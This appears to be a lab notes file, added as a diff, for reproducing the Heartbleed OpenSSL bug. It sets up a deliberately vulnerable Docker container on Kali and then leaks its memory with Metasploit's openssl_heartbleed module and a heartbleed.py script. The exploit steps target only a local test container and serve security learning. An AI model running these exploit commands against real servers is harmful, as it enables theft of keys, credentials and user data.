@@ -1,0 +1,53 @@
+sudo apt-get update
+sudo apt-get install python2-dev
+sudo apt-get install docker.io
+
+
+git clone https://github.com/injcristianrojas/heartbleed-example.git
+cd heartbleed-example 
+edit docker-compose (443: 443)
+sudo docker pull docker.io/andrewmichaelsmith/docker-heartbleed
+docker-compose up
+sudo docker run -d andrewmichaelsmith/docker-heartbleed
+
+
+Another terminal:
+sudo docker ps #note conatiner id
+sudo docker inspect <container id> | grep IPAddress #note ip
+
+
+Put Data:
+./stimulate_server.py -a 127.0.0.1:443
+
+Metasploit:
+sudo msfdb init && msfconsole
+use auxiliary/scanner/ssl/openssl_heartbleed
+set VERBOSE true
+set RHOSTS <ip>
+exploit
+
+defribulator v1.16:
+./heartbleed.py 127.0.0.1
+
+
+Pip 2 install:
+curl https://bootstrap.pypa.io/pip/2.7/get-pip.py --output /tmp/get-pip.py
+sudo python2 /tmp/get-pip.py
+sudo apt-get install python2-dev
+pip install --upgrade setuptools
+pip install gmpy
+pip install pyasn1
+
+
+
+PRETTY_NAME="Kali GNU/Linux Rolling"
+NAME="Kali GNU/Linux"
+ID=kali
+VERSION="2021.3"
+VERSION_ID="2021.3"
+VERSION_CODENAME="kali-rolling"
+ID_LIKE=debian
+ANSI_COLOR="1;31"
+HOME_URL="https://www.kali.org/"
+SUPPORT_URL="https://forums.kali.org/"
+BUG_REPORT_URL="https://bugs.kali.org/"
